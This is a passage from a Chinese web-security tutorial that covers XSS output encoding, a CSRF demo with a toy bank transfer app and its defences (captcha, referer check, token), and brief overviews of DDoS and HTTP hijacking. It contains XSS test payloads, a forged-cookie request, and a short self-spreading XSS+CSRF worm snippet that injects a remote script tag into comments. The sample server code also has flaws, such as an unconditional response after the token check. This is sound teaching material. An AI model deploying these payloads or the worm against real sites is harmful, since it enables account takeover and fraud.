app.listen(3000, () =&gt; console.log(&#39;The server is starting at port 3000&#39;));
</code></pre>
<pre><code class="lang-js">let http = require(&#39;http&#39;);
let comment = JSON.stringify({
    &quot;content&quot;: &quot;zfpx&quot;
});
const options = {
    host: &#39;localhost&#39;,
    port: 3000,
    path: &#39;/api/comments&#39;,
    method: &#39;POST&#39;,
    headers: {
        &quot;Cookie&quot;: &quot;sessionId=user_313.2022765155167&quot;,
        &quot;Content-Type&quot;: &quot;application/json&quot;
    }
}
const req = http.request(options, function (res) {
    res.setEncoding(&#39;utf8&#39;);
    res.on(&#39;data&#39;, function (data) {
        console.log(&#39;data:&#39;, data);
    });
    res.on(&#39;end&#39;, function () {
        console.log(&#39;end:&#39;);
    });
});
req.on(&#39;error&#39;, function (error) {
    console.log(error);
});
req.write(comment);
req.end();
</code></pre>
<h3 id="1-8-">1.8 输出检查</h3>
<h3 id="1-8-1-html-">1.8.1 HTML执行环境</h3>
<p>使用之前要做一个htmlEncode(). 把HTML标签转成普通文本来对待</p>
<ul>
<li>HTML标签 <div>$desc</div></li>
<li>HTML属性 <div className="$clsName"></div></li>
</ul>
<h3 id="1-8-2-js-">1.8.2 JS执行环境</h3>
<p>使用之前要做一个javascriptEncode(). 一般用/进行转义</p>
<ul>
<li>script标签中 <script>let x = &quot;$var&quot;;</script></li>
<li>&#x4E8B;&#x4EF6;&#x5C5E;&#x6027;&#x4E2D; <a href="" onclick="join($room)">&#x52A0;&#x5165;&#x623F;&#x95F4;</a></li>
</ul>
<h3 id="t111.8.3 URL&#x89E3;&#x6790;&#x73AF;&#x5883;">1.8.3 URL&#x89E3;&#x6790;&#x73AF;&#x5883; <a href="#t111.8.3 URL&#x89E3;&#x6790;&#x73AF;&#x5883;"> # </a></h3>
<p>&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x8981;&#x505A;urlencode()</p>
<ul>
<li>url&#x4E2D; <a href="http://localhost:3000/articles/$id">link</a></li>
</ul>
<pre><code class="lang-js">



    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>



    <div id="intag"></div>
    <div id="tagAttr"></div>
    <div id="inEvent"></div>
    <div id="inLink"></div>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script>
        function htmlEncode(str) {
            return String(str)
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#39;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
        }

        let data = {
            desc: "<script>alert(1);<\/script>",
            clsName: '"><script>alert(2);<\/script>',
            url: '"><script>alert(3);<\/script>',
            id: '"><script>alert(4);<\/script>',
        }
        $('#intag').html(htmlEncode(data.desc));
        $('#tagAttr').html(`<a class = "${htmlEncode(data.clsName)}">标签属性中</a>`);

        $('#inEvent').html(`<a href="#" onclick = "go('${data.url}')">事件参数</a>`);
        $('#inLink').html(`<a href="http://localhost:3000/articles/${encodeURI(data.id)}">link</a>`);
        function go(url) {
            console.log(url);
        }

        //使用“\”对特殊字符进行转义，除数字字母之外，小于127使用16进制“\xHH”的方式进行编码，大于用unicode（非常严格模式）。
        var JavaScriptEncode = function (str) {
            var hex = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f');
            function changeTo16Hex(charCode) {
                return "\\x" + charCode.charCodeAt(0).toString(16);
            }

            function encodeCharx(original) {
                var found = true;
                var thecharchar = original.charAt(0);
                var thechar = original.charCodeAt(0);
                switch (thecharchar) {
                    case '\n': return "\\n"; break; //newline
                    case '\r': return "\\r"; break; //Carriage return
                    case '\'': return "\\'"; break;
                    case '"': return "\\\""; break;
                    case '\&': return "\\&"; break;
                    case '\\': return "\\\\"; break;
                    case '\t': return "\\t"; break;
                    case '\b': return "\\b"; break;
                    case '\f': return "\\f"; break;
                    case '/': return "\\x2F"; break;
                    case '<': return "\\x3C"; break;
                    case '>': return "\\x3E"; break;
                    default:
                        found = false;
                        break;
                }
                if (!found) {
                    if (thechar > 47 && thechar < 58) { //数字
                        return original;
                    }

                    if (thechar > 64 && thechar < 91) { //大写字母
                        return original;
                    }

                    if (thechar > 96 && thechar < 123) { //小写字母
                        return original;
                    }

                    if (thechar > 127) { //大于127用unicode
                        var c = thechar;
                        var a4 = c % 16;
                        c = Math.floor(c / 16);
                        var a3 = c % 16;
                        c = Math.floor(c / 16);
                        var a2 = c % 16;
                        c = Math.floor(c / 16);
                        var a1 = c % 16;
                        return "\\u" + hex[a1] + hex[a2] + hex[a3] + hex[a4] + "";
                    }
                    else {
                        return changeTo16Hex(original);
                    }

                }
            }

            var preescape = str;
            var escaped = "";
            var i = 0;
            for (i = 0; i < preescape.length; i++) {
                escaped = escaped + encodeCharx(preescape.charAt(i));
            }
            return escaped;
        }
    </script>



</code></pre>
<h2 id="t122. CSRF">2. CSRF <a href="#t122. CSRF"> # </a></h2>
<h3 id="t132.1 &#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;">2.1 &#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020; <a href="#t132.1 &#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;"> # </a></h3>
<p>Cross Site Request Forgery &#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;</p>
<ol>
<li>&#x7528;&#x6237;A&#x767B;&#x5F55;&#x94F6;&#x884C;&#x7F51;&#x7AD9;&#xFF0C;&#x767B;&#x5F55;&#x6210;&#x529F;&#x540E;&#x4F1A;&#x8BBE;&#x7F6E;cookie</li>
<li>&#x9ED1;&#x5BA2;&#x8BF1;&#x5BFC;&#x7528;&#x6237;A&#x767B;&#x5F55;&#x5230;&#x9ED1;&#x5BA2;&#x7684;&#x7AD9;&#x70B9;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x9875;&#x9762;</li>
<li>&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x4F1A;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x8F6C;&#x8D26;&#x8BF7;&#x6C42;&#x5230;&#x94F6;&#x884C;&#x7F51;&#x7AD9;</li>
</ol>
<p>bank.html</p>
<pre><code class="lang-js">



    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>&#x6211;&#x7684;&#x94F6;&#x884C;</title>
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css">



    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <p>&#x7528;&#x6237;&#x540D;
                            <span id="username"></span>
                        </p>
                        <p>&#x4F59;&#x989D;
                            <span id="money"></span>
                        </p>
                    </div>
                    <div class="panel-body">
                        <form onsubmit="transfer(event)">
                            <div class="form-group">
                                <label for="target">&#x8F6C;&#x8D26;&#x7528;&#x6237;</label>
                                <input id="target" class="form-control" placeholder="&#x8BF7;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;">
                            </div>
                            <div class="form-group">
                                <label for="amount">&#x91D1;&#x989D;</label>
                                <input id="amount" class="form-control" placeholder="&#x8BF7;&#x8F93;&#x5165;&#x8F6C;&#x8D26;&#x7684;&#x91D1;&#x989D;">
                            </div>
                            <div class="form-group">
                                <input type="submit" class="btn btn-primary">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script>
        $(function () {
            $.get('/api/user').then(data => {
                console.log(data);
                console.log(data.user.username);
                if (data.code == 0) {
                    $('#username').html(data.user.username);
                    $('#money').html(data.user.money);
                } else {
                    alert('用户未登录');
                    location.href = '/login.html';
                }
            });
        });
        function transfer(event) {
            event.preventDefault();
            let target = $('#target').val();
            let amount = $('#amount').val();
            $.post('/api/transfer', { target, amount }).then(data => {
                if (data.code == 0) {
                    alert('转账成功');
                    location.reload();
                } else {
                    alert('用户未登录');
                    location.href = '/login.html';
                }
            });
        }
    </script>



</code></pre>
<pre><code class="lang-js">app.get(&apos;/api/user&apos;, function (req, res) {
    let { username } = userSessions[req.cookies.sessionId];
    if (username) {
        let user;
        for (let i = 0; i &lt; users.length; i++) {
            if (username == users[i].username) {
                user = users[i];
                break;
            }
        }
        res.json({ code: 0, user });
    } else {
        res.json({ code: 1, error: &apos;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x767B;&#x5F55;&apos; });
    }
});

app.post(&apos;/api/transfer&apos;, function (req, res) {
    let { target, amount } = req.body;
    amount = isNaN(amount) ? 0 : Number(amount);
    let { username } = userSessions[req.cookies.sessionId];
    if (username) {
        let user;
        for (let i = 0; i &lt; users.length; i++) {
            if (username == users[i].username) {
                users[i].money -= amount;
            } else if (target == users[i].username) {
                users[i].money += amount;
            }
        }
        res.json({ code: 0 });
    } else {
        res.json({ code: 1, error: &apos;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x767B;&#x5F55;&apos; });
    }
})
</code></pre>
<h3 id="t142.2 &#x9632;&#x5FA1;">2.2 &#x9632;&#x5FA1; <a href="#t142.2 &#x9632;&#x5FA1;"> # </a></h3>
<ul>
<li>&#x7528;&#x6237;&#x4E0D;&#x77E5;&#x60C5;  &#x9A8C;&#x8BC1;&#x7801; &#x5F71;&#x54CD;&#x7528;&#x6237;&#x4F53;&#x9A8C; </li>
<li>&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42; &#x4F7F;&#x7528;refer&#x9A8C;&#x8BC1; &#x4E0D;&#x53EF;&#x9760;</li>
<li>&#x53C2;&#x6570;&#x4F2A;&#x9020; token &#x6700;&#x4E3B;&#x6D41;&#x7684;&#x9632;&#x5FA1;CSRF</li>
</ul>
<h4 id="t152.2.1  &#x9A8C;&#x8BC1;&#x7801;">2.2.1  &#x9A8C;&#x8BC1;&#x7801; <a href="#t152.2.1  &#x9A8C;&#x8BC1;&#x7801;"> # </a></h4>
<p>server.js</p>
<pre><code class="lang-js">var svgCaptcha = require(&apos;svg-captcha&apos;);
app.get(&apos;/api/captcha&apos;, function (req, res) {
    let session = userSessions[req.cookies.sessionId];
    if (session) {
        var codeConfig = {
            size: 5,// &#x9A8C;&#x8BC1;&#x7801;&#x957F;&#x5EA6;
            ignoreChars: &apos;0o1i&apos;, // &#x9A8C;&#x8BC1;&#x7801;&#x5B57;&#x7B26;&#x4E2D;&#x6392;&#x9664; 0o1i
            noise: 2, // &#x5E72;&#x6270;&#x7EBF;&#x6761;&#x7684;&#x6570;&#x91CF;
            height: 44
        }
        var captcha = svgCaptcha.create(codeConfig);
        session.captcha = captcha.text.toLowerCase(); //&#x5B58;session&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x63A5;&#x53E3;&#x83B7;&#x53D6;&#x6587;&#x5B57;&#x7801;
        res.send({ code: 0, captcha: captcha.data });
    } else {
        res.json({ code: 1, data: &apos;&#x6CA1;&#x6709;&#x8BE5;&#x7528;&#x6237;&apos; });
    }
});
</code></pre>
<p>bank.html</p>
<pre><code class="lang-js"><div class="form-group">
    <label for="captcha" id="captcha"></label>
    <input id="captcha" class="form-control" placeholder="&#x8BF7;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;">
</div>


 $.get(&apos;/api/captcha&apos;).then(data =&gt; {
    if (data.code == 0) {
        $(&apos;#captcha&apos;).html(data.captcha);
    } else {
        alert(&apos;&#x7528;&#x6237;&#x672A;&#x767B;&#x5F55;&apos;);
        location.href = &apos;/login.html&apos;;
    }
});
</code></pre>
<h4 id="t162.2.2 refer &#x9A8C;&#x8BC1;">2.2.2 refer &#x9A8C;&#x8BC1; <a href="#t162.2.2 refer &#x9A8C;&#x8BC1;"> # </a></h4>
<pre><code class="lang-js"> let referer = req.headers[&apos;referer&apos;];
    if (/^https?:\/\/localhost:3000/.test(referer)) {

    } else {
        res.json({ code: 1, error: &apos;referer&#x4E0D;&#x6B63;&#x786E;&apos; });
    }
</code></pre>
<h4 id="t172.2.3 token&#x9A8C;&#x8BC1;">2.2.3 token&#x9A8C;&#x8BC1; <a href="#t172.2.3 token&#x9A8C;&#x8BC1;"> # </a></h4>
<p>bank.html</p>
<pre><code class="lang-js">function getClientToken() {
            let result = document.cookie.match(/token=([^;]+)/);
            return result ? result[1] : &apos;&apos;;
        }
function transfer(event) {
            event.preventDefault();
            let target = $(&apos;#target&apos;).val();
            let amount = $(&apos;#amount&apos;).val();
            let captcha = $(&apos;#captcha&apos;).val();
            $.post(&apos;/api/transfer&apos;, {
                target,
                amount,
                captcha,
                clientToken: getClientToken()
            }).then(data =&gt; {
                if (data.code == 0) {
                    alert(&apos;&#x8F6C;&#x8D26;&#x6210;&#x529F;&apos;);
                    location.reload();
                } else {
                    alert(&apos;&#x7528;&#x6237;&#x672A;&#x767B;&#x5F55;&apos;);
                    location.href = &apos;/login.html&apos;;
                }
            });
}
</code></pre>
<p>server.js</p>
<pre><code class="lang-js">app.post(&apos;/api/transfer&apos;, function (req, res) {
    // let referer = req.headers[&apos;referer&apos;];
    //if (/^https?:\/\/localhost:3000/.test(referer)) {
    let { target, amount, clientToken, captcha } = req.body;
    amount = isNaN(amount) ? 0 : Number(amount);
    let { username, token } = userSessions[req.cookies.sessionId];
    if (username) {
        if (clientToken == token) {
            let user;
            for (let i = 0; i &lt; users.length; i++) {
                if (username == users[i].username) {
                    users[i].money -= amount;
                } else if (target == users[i].username) {
                    users[i].money += amount;
                }
            }
            res.json({ code: 0 });
        } else {
            res.json({ code: 1, error: &apos;&#x8FDD;&#x6CD5;&#x64CD;&#x4F5C;&apos; });
        }
    } else {
        res.json({ code: 1, error: &apos;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x767B;&#x5F55;&apos; });
    }
    //} else {
    res.json({ code: 1, error: &apos;referer&#x4E0D;&#x6B63;&#x786E;&apos; });
    //}
})
</code></pre>
<h4 id="t182.2.4 xss+csrf(&#x8815;&#x866B;)">2.2.4 xss+csrf(&#x8815;&#x866B;) <a href="#t182.2.4 xss+csrf(&#x8815;&#x866B;)"> # </a></h4>
<p>&#x4E0D;&#x65AD;&#x4F20;&#x64AD;&#x7684;xss+csrf&#x653B;&#x51FB; 
worm.js</p>
<pre><code class="lang-js">const attack = &apos;<script src="http://localhost:3001/worm.js"></script>&apos;;
$.post(&apos;/api/comments&apos;, { content: &apos;haha&apos; + attack });
</code></pre>
<h2 id="t193. DDOS&#x653B;&#x51FB;">3. DDOS&#x653B;&#x51FB; <a href="#t193. DDOS&#x653B;&#x51FB;"> # </a></h2>
<p>&#x5206;&#x5E03;&#x5F0F;&#x62D2;&#x7EDD;&#x670D;&#x52A1;(Distribute Denial Of Service)</p>
<ul>
<li>&#x9ED1;&#x5BA2;&#x63A7;&#x5236;&#x5927;&#x91CF;&#x7684;&#x8089;&#x9E21;&#x5411;&#x53D7;&#x5BB3;&#x4E3B;&#x673A;&#x53D1;&#x9001;&#x975E;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;&#xFF0C;&#x5BFC;&#x81F4;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x8017;&#x5C3D;&#x8D44;&#x6E90;&#x4E0D;&#x80FD;&#x4E3A;&#x5408;&#x6CD5;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;</li>
<li>&#x9A8C;&#x8BC1;&#x7801;&#x662F;&#x6211;&#x4EEC;&#x5728;&#x4E92;&#x8054;&#x7F51;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;&#x6280;&#x672F;&#x4E4B;&#x4E00;&#x3002;&#x4E0D;&#x5F97;&#x4E0D;&#x8BF4;&#x9A8C;&#x8BC1;&#x7801;&#x662F;&#x80FD;&#x591F;&#x6709;&#x6548;&#x5730;&#x9632;&#x6B62;&#x591A;&#x6B21;&#x91CD;&#x590D;&#x8BF7;&#x6C42;&#x7684;&#x884C;&#x4E3A;&#x3002;</li>
<li>&#x9650;&#x5236;&#x8BF7;&#x6C42;&#x9891;&#x7387;&#x662F;&#x6211;&#x4EEC;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x9488;&#x5BF9; DDOS &#x653B;&#x51FB;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;&#x3002;&#x5176;&#x539F;&#x7406;&#x4E3A;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x9891;&#x7387;&#x7684;&#x9650;&#x5236;</li>
<li>&#x589E;&#x52A0;&#x673A;&#x5668;&#x589E;&#x52A0;&#x670D;&#x52A1;&#x5E26;&#x5BBD;&#x3002;&#x53EA;&#x8981;&#x8D85;&#x8FC7;&#x4E86;&#x653B;&#x51FB;&#x6D41;&#x91CF;&#x4FBF;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x670D;&#x52A1;&#x762B;&#x75EA;</li>
<li>&#x8BBE;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;&#x4E1A;&#x52A1;&#x4E3A;&#x5206;&#x5E03;&#x5F0F;&#x670D;&#x52A1;&#xFF0C;&#x9632;&#x6B62;&#x5355;&#x70B9;&#x5931;&#x6548;</li>
<li>&#x4F7F;&#x7528;&#x4E3B;&#x6D41;&#x4E91;&#x7CFB;&#x7EDF;&#x548C; CDN&#xFF08;&#x4E91;&#x548C; CDN &#x5176;&#x81EA;&#x8EAB;&#x6709; DDOS &#x7684;&#x9632;&#x8303;&#x4F5C;&#x7528;&#xFF09;</li>
<li>&#x4F18;&#x5316;&#x8D44;&#x6E90;&#x4F7F;&#x7528;&#x63D0;&#x9AD8; web server &#x7684;&#x8D1F;&#x8F7D;&#x80FD;&#x529B;</li>
</ul>
<h2 id="t204. HTTP&#x52AB;&#x6301;">4. HTTP&#x52AB;&#x6301; <a href="#t204. HTTP&#x52AB;&#x6301;"> # </a></h2>
<ul>
<li>&#x5728;&#x7528;&#x6237;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x5176;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x670D;&#x52A1;&#x5668;&#x7ECF;&#x8FC7;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x534F;&#x8C03;&#x540E;&#xFF0C;&#x4E8C;&#x8005;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x4E86;&#x4E00;&#x6761;&#x4E13;&#x7528;&#x7684;&#x6570;&#x636E;&#x901A;&#x9053;&#xFF0C;&#x7528;&#x6237;&#x7AEF;&#x7A0B;&#x5E8F;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x5F00;&#x653E;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#x7AEF;&#x53E3;&#x7528;&#x4E8E;&#x63A5;&#x6536;&#x6570;&#x636E;&#x62A5;&#x6587;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x5168;&#x90E8;&#x6570;&#x636E;&#x6309;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x5206;&#x89E3;&#x6253;&#x5305;&#xFF0C;&#x5F62;&#x6210;&#x8FDE;&#x7EED;&#x6570;&#x636E;&#x62A5;&#x6587;&#x3002;</li>
<li>&#x7528;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x5168;&#x90E8;&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x6309;&#x7167;&#x534F;&#x8BAE;&#x6807;&#x51C6;&#x6765;&#x89E3;&#x5305;&#x7EC4;&#x5408;&#x83B7;&#x5F97;&#x5B8C;&#x6574;&#x7684;&#x7F51;&#x7EDC;&#x6570;&#x636E;&#x3002;&#x5176;&#x4E2D;&#x4F20;&#x8F93;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x90FD;&#x6709;&#x7279;&#x5B9A;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x8868;&#x793A;&#x5176;&#x6765;&#x6E90;&#x3001;&#x643A;&#x5E26;&#x7684;&#x6570;&#x636E;&#x5C5E;&#x6027;&#x4EE5;&#x53CA;&#x8981;&#x5230;&#x4F55;&#x5904;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ECF;&#x8FC7;&#x7F51;&#x7EDC;&#x8DEF;&#x5F84;&#x4E2D;ISP&#x7684;&#x8DEF;&#x7531;&#x5668;&#x4F20;&#x8F93;&#x63A5;&#x529B;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x5230;&#x8FBE;&#x76EE;&#x7684;&#x5730;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</li>
<li>HTTP&#x52AB;&#x6301;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x8005;&#x4E0E;&#x5176;&#x76EE;&#x7684;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x6240;&#x5EFA;&#x7ACB;&#x7684;&#x4E13;&#x7528;&#x6570;&#x636E;&#x901A;&#x9053;&#x4E2D;&#xFF0C;&#x76D1;&#x89C6;&#x7279;&#x5B9A;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x63D0;&#x793A;&#x5F53;&#x6EE1;&#x8DB3;&#x8BBE;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x5728;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x63D2;&#x5165;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x7F51;&#x7EDC;&#x6570;&#x636E;&#x62A5;&#x6587;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x8BA9;&#x7528;&#x6237;&#x7AEF;&#x7A0B;&#x5E8F;&#x89E3;&#x91CA;&#x201C;&#x9519;&#x8BEF;&#x201D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4EE5;&#x5F39;&#x51FA;&#x65B0;&#x7A97;&#x53E3;&#x7684;&#x5F62;&#x5F0F;&#x5728;&#x4F7F;&#x7528;&#x8005;&#x754C;&#x9762;&#x5C55;&#x793A;&#x5BA3;&#x4F20;&#x6027;&#x5E7F;&#x544A;&#x6216;&#x8005;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x67D0;&#x7F51;&#x7AD9;&#x7684;&#x5185;&#x5BB9;&#x3002;</li>
</ul>
<h2 id="t21&#x53C2;&#x8003;">&#x53C2;&#x8003; <a href="#t21&#x53C2;&#x8003;"> # </a></h2>
<ul>
<li><a href="https://gitee.com/zhufengpeixun/zf-safe">zf-safe</a></li>
</ul>

        <div class="copyright">Powered by <a href="https://github.com/jaywcjlove/idoc" target="_blank">idoc</a>. Dependence <a href="https://nodejs.org">Node.js</a> run.</div>
    